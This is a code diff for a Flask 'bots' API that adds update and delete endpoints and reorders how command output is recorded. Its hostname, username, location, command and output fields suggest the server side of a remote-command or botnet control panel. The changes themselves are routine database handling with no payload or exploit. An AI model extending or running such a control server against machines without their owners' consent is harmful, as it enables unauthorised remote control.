@@ -12,6 +12,9 @@ from utils.database import database
 bots = Blueprint("bots", __name__)
 
 
+# Success Code: 0 (Evasive Mistake) -> 1 (Success) 
+
+
 @bots.route("/api/bot", methods=["POST"])
 def add_bot():
 
@@ -45,18 +48,18 @@ def add_bot():
 		return { "success": success_code }
 
 
-@bots.route("/api/bot", methods=["PUT"])
-def update_bot():
+@bots.route("/api/bot/<uuid>", methods=["PUT"])
+def update_bot(uuid):
 
 	success_code = 0
 
-	requests_data = request.get_json()	
-
-	bot = Bot.query.get(requests_data["uuid"])
+	bot = Bot.query.get(uuid)
 
 	if not bot:
 
 		return { "success": success_code }
+
+	requests_data = request.get_json()
 
 	bot.hostname = requests_data["hostname"]
 	bot.username = requests_data["username"]
@@ -68,6 +71,34 @@ def update_bot():
 	bot.location = requests_data["location"]
 
 	try: 
+
+		database.session.commit()
+
+		success_code = 1
+
+	except Exception:
+
+		database.session.rollback()
+
+	finally:
+
+		return { "success": success_code }
+
+
+@bots.route("/api/bot/<uuid>", methods=["DELETE"])
+def delete_bot(uuid):
+
+	success_code = 0
+
+	bot = Bot.query.get(uuid)
+
+	if not bot:
+
+		return { "success": success_code }
+
+	try: 
+
+		database.session.delete(bot)
 
 		database.session.commit()
 
@@ -128,10 +159,6 @@ def update_output_from_command(uuid):
 
 	success_code = 0
 
-	# { "output": "lalalalalalalal" } 
-
-	requests_data = request.get_json()
-
 	bot = Bot.query.get(uuid)
 
 	if not bot:
@@ -139,6 +166,10 @@ def update_output_from_command(uuid):
 		return { "success": 0 }
 
 	# Get last command
+
+	# { "output": "lalalalalalalal" } 
+
+	requests_data = request.get_json()
 
 	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
 
